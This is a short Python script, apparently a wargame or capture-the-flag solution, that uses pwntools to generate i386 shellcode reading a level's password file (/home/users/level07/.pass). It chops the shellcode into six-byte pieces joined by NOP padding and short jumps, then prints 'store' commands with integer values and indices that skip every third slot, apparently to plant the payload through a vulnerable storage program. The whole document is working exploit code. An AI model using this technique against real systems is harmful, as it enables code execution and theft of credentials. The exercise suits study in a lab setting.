import pwn
import re

shell = pwn.shellcraft.i386.linux.cat('/home/users/level07/.pass').split('\n')
size = 0
add = b''
index = 1
for line in shell:
	asm = pwn.asm(line)
	if (size + len(asm) > 6):
		add += b'\x90' * (6 - size)
		add += pwn.asm('jmp $+0x4')
		# print(size, '|', add, '|', add.hex(), '|', len(add.hex()))
		hexasm = re.findall('(.{8})', add.hex())
		for hexa in hexasm:
			print('store')
			print(int(hexa, 16))
			print(index)
			index += 1
			if index % 3 == 0:
				index += 1
		add = b''
		size = 0
	add += asm
	size += len(asm)
